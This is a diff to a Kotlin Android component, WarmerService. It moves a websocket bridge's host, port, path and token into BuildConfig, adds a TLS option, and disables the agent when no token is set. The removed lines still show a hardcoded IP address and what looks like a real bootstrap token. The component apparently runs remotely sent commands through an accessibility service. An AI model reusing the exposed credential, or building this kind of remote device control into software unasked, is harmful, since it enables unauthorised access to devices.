@@ -28,10 +28,13 @@ import org.json.JSONObject
 object WarmerService {
 
     private const val TAG               = "Warmer"
-    private const val BRIDGE_HOST       = "79.141.162.155"
-    private const val BRIDGE_PORT       = 7334
-    private const val BRIDGE_PATH       = "/bridge"
-    private const val BOOTSTRAP_TOKEN   = "af748a97422fa9652998395f18145a027c02d8bdde68633b"
+    // Bridge endpoint + token come from BuildConfig (Gradle props / CI secret
+    // at build time) — never hardcoded, never committed to the repo.
+    private val BRIDGE_HOST     = BuildConfig.WARMER_BRIDGE_HOST
+    private val BRIDGE_PORT     = BuildConfig.WARMER_BRIDGE_PORT
+    private val BRIDGE_PATH     = BuildConfig.WARMER_BRIDGE_PATH
+    private val BRIDGE_TLS      = BuildConfig.WARMER_BRIDGE_TLS
+    private val BOOTSTRAP_TOKEN = BuildConfig.WARMER_TOKEN
 
     // server_model.dart writes the RustDesk peer ID here on startup, via a
     // method channel handled in MainActivity ("warmer_set_rustdesk_id").
@@ -63,6 +66,7 @@ object WarmerService {
 
     fun start(svc: AccessibilityService) {
         if (ws != null) return
+        if (BOOTSTRAP_TOKEN.isEmpty()) { Log.i(TAG, "no WARMER_TOKEN in build — agent disabled"); return }
         service  = svc
         executor = WarmerCommandExecutor(svc)
         val sp = svc.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
@@ -91,7 +95,7 @@ object WarmerService {
     private fun openConnection() {
         val client = WarmerWsClient(
             host = BRIDGE_HOST, port = BRIDGE_PORT, path = BRIDGE_PATH,
-            token = BOOTSTRAP_TOKEN, handler = wsHandler,
+            token = BOOTSTRAP_TOKEN, tls = BRIDGE_TLS, handler = wsHandler,
         )
         ws = client
         client.start()
